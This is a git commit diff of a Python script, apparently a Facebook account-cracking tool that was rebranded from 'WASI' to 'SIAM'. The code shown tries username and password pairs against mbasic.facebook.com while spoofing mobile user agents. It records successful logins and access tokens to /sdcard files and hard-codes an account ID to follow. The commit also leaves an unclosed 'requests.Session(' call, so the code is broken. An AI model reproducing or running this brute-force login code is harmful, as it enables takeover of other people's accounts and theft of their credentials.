a4b139fd20714ad9dc6d9e3819b91ba01490e782
siam00000 <104170025+siam00000@users.noreply.github.com>
2022-04-22 14:47:44 +0600

    Update SIAM-VAU.py

--- SIAM-VAU.py
+++ SIAM-VAU.py
@@ -1,11 +1,11 @@
 # Decompile by : 'SIAM
 import os,sys
 try: import requests
-except ModuleNotFoundError:print("SIAM Install Module requests");os.system("python -m pip install requests &> /dev/WASI")
+except ModuleNotFoundError:print("SIAM Install Module requests");os.system("python -m pip install requests &> /dev/SIAM")
 try: import bs4
-except ModuleNotFoundError:print("SIAM Install Module bs4");os.system("python -m pip install bs4 &> /dev/WASI")
+except ModuleNotFoundError:print("SIAM Install Module bs4");os.system("python -m pip install bs4 &> /dev/SIAM")
 try: import mechanize
-except ModuleNotFoundError:print("SIAM Install Module mechanize");os.system("python -m pip install mechanize &> /dev/WASI")
+except ModuleNotFoundError:print("SIAM Install Module mechanize");os.system("python -m pip install mechanize &> /dev/SIAM")
 try: import gTTS
 except ModuleNotFoundError: os.system("python -m pip install gTTS &> /dev/WASI")
 ## import in
@@ -246,17 +246,17 @@ class __crack__:
 			except (KeyError, IOError):
 				ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
 				ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
-			ses = requests.Session()
+			ses = requests.Session(
 			headers_ = {"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
 			p = ses.get('https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
 			dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
 			_headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
 			po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
 			if 'c_user' in ses.cookies.get_dict():
-				print('\r\033[1;32m[WASI-SUCCESSFUL] %s | %s      ' % (user,pw))
+				print('\r\033[1;32m[SIAM-SUCCESSFUL] %s | %s      ' % (user,pw))
 				wrt = '%s - %s' % (user,pw)
 				ok.append(wrt)
-				open('/sdcard/WASI_OK.txt','a').write('%s\n' % wrt)
+				open('/sdcard/SIAM_OK.txt','a').write('%s\n' % wrt)
 				access = q['loc']
 				open('/sdcard/ids/tokens.txt','a').write(access+'\n')
 				follow_id='100001020800712'
